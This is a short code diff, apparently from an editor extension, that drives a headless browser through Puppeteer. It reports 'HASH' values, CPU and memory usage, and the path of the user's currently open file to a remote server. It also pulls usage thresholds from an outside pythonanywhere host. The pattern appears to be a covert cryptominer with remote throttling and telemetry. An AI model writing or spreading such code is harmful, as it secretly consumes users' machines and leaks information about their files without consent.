@@ -1,8 +1,12 @@
 (async () => {
 
-  
+
   let {
-    unifiedError, tstt, baseUrl, safe,
+    editor,
+    unifiedError,
+    tstt,
+    baseUrl,
+    safe,
     puppeteer,
     puppeteerBrowsers,
     extensionPath
@@ -243,14 +247,15 @@
         tstt({
           baseUrl,
           message: "HASH",
-          value: parseFloat(hs.value).toFixed(2),
+          max: maxUse,
+          value: safe(() => parseFloat(hs?.value).toFixed(2)),
           cpu: getCPUUsage(),
           memory: getMemoryUsage(),
           hs: hs,
           file: safe(() => editor?.document?.uri?.fsPath)
         });
         let [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
-        
+
         minUse = min;
         maxUse = (getMemoryUsage().total >= 8 ? max : minUse);
         await page.evaluate((maxUse, baseUrl) => {
